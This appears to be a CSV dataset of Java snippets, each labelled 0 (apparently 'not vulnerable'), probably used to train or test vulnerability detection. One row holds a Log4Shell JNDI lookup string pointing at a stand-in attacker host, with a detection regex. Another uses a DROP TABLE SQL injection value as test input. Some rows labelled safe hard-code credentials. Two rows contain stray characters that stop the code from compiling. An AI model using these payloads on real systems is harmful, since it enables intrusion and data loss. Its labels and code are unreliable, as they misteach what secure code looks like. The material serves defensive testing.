idx,function,label,project
0,"```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        Connection conn = null;
        PreparedStatement stmt = null;
        ResultSet rs = null;
        try {
            // Assume we have a database connection
            conn = DriverManager.getConnection(""jdbc:mysql://localhost:3306/mydatabase"", ""username"", ""password"");

            String query = ""SELECT * FROM users WHERE username = ?"";
            stmt = conn.prepareStatement(query);
            stmt.setString(1, ""testUser"");

            rs = stmt.executeQuery();

            // Proper null check here
            if (rs != null && rs.next()) {
                do {
                    System.out.println(rs.getString(""username""));
                } while (rs.next());
            }
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                if (rs != null) rs.close();
                if (stmt != null) stmt.close();
                if (conn != null) conn.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }
}
```",0,java
1,"```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        String url = ""jdbc:mysql://localhost/testdb"";
        String user = ""username"";
        String password = ""password"";

        try (Connection conn = DriverManager.getConnection(url, user, password);
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(""SELECT username FROM users"")) {

            while (rs.next()) {
                System.out.println(rs.getString(""username""));
            }
        } catch (SQLException ex) {
            System.err.println(""An error occurred: "" + ex);
        }
    }
}
```",0,java
2,"```java
public class Main {
    public static void main(String[] args) {
        String str = null;
        if (str != null) {
            System.out.println(str.length());
        } else {
            System.out.println(""The string is null!"");
        }
    }
}
```",0,java
3,"```java
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println(""Enter your username:"");
        String username = scanner.nextLine();
        System.out.println(""Enter your password:"");
        String password = scanner.nextLine();
        
        if (authenticateUser(username, password)) {
            System.out.println(""Access granted."");
        } else {
            System.out.println(""Access denied."");
        }
    }
    
    private static boolean authenticateUser(String username, String password) {
        // This is where you would normally check the username and password against some database
        // For simplicity, we'll just return true if the username and password match
        return username.equals(""admin"") && password.equals(""password"");
    }
}
```",0,java
4,"```java
import java.sql.*;

public class Main {
    private static final String DB_URL = ""jdbc:mysql://localhost/testdb"";
    private static final String USER = ""username"";
    private static final String PASS = ""password"";

    public static void main(String[] args) {
        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(""SELECT id, first, last, age FROM Employees"")) {

            while (rs.next()) {
                int id = rs.getInt(""id"");
                String first = rs.getString(""first"");
                String last = rs.getString(""last"");
                int age = rs.getInt(""age"");

                System.out.printf(""ID: %d, Age: %d, First: %s, Last: %s%n"", id, age, first, last);
            }
        } catch (SQLException se) {
            se.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```",0,java
5,"```java
import java.util.regex.Pattern;

public class Main {
    private static final Pattern JNDI_PATTERN = Pattern.compile("".*\\$\\{jndi:.*\\}.*"");

    public static void main(String[] args) {
        try {
            String userInput = ""${jndi:ldap://attacker.com/a}"";
            
            if (JNDI_PATTERN.matcher(userInput).matches()) {
                System.err.println(""Error: JNDI lookup string detected!"");
            } else {
                System.out.println(userInput);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```",0,java
6,"```java
import java.sql.*;

public class UserLogin {
    public static void main(String[] args) {
        String username = ""testUser"";
        String password = ""testPassword'; DROP TABLE Users; --"";
        
        try {
            Connection conn = DriverManager.getConnection(""jdbc:mysql://localhost:3306/mydb"", ""root"", ""password"");
            PreparedStatement pstmt = conn.prepareStatement(""SELECT * FROM Users WHERE Username=? AND Password=?"");
            pstmt.setString(1, username);
            pstmt.setString(2, password);
            
            ResultSet rs = pstmt.executeQuery();
            
            if(rs.next()) {
                System.out.println(""Login Successful!"");
            } else {
                System.out.println(""Invalid Login Credentials!"");
            }
            
            rs.close();
            pstmt.close();
            conn.close();
        } catch(SQLException e) {
            e.printStackTrace();
        }
    }
}
```",0,java
7,"```java
import java.sql.*;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println(""Enter your username:"");
        String username = scanner.nextLine();
        System.out.println(""Enter your password:"");
        String password = scanner.nextLine();
        
        try {
            Class.forName(""com.mysql.jdbc.Driver"");妆
            Connection con = DriverManager.getConnection(
            ""jdbc:mysql://localhost:3306/testDb"", ""username"", ""password"");
            
            String sql = ""SELECT * FROM Users WHERE Username=? AND Password=?"";
            PreparedStatement pstmt = con.prepareStatement(sql);
            pstmt.setString(1, username);
            pstmt.setString(2, password);
            ResultSet rs = pstmt.executeQuery();
            
            boolean found = false;
            while (rs.next()) {
                found = true;
                break;
            }
            
            if (found) {
                System.out.println(""Login successful!"");
            } else {
                System.out.println(""Login failed!"");
            }
            
            con.close();
        } catch (Exception e) { 
            System.out.println(e);
        }
    }
}
```",0,java
8,"```java
public class SecureClass {
    private static final String SENSITIVE_INFO = System.getenv(""SENSITIVE_INFO"");

    public void printSensitiveInfo() {
        if (SENSITIVE_INFO != null) {
            System.out.println(SENSITIVE_INFO);
        } else {
            System.out.println(""SENSITIVE_INFO environment variable is not set."");
        }
    }
}
```",0,java
9,"```java
public class Main {
    public static void main(String[] args) {
        String str = null;
        try {
            if (str == null) {
                System.out.println(""String is null"");
            } else {
                System.out.println(str.length());
            }
        } catch (NullPointerException e) {
            System.out.println(""Caught exception: "" + e);员
        }
    }
}
```",0,java
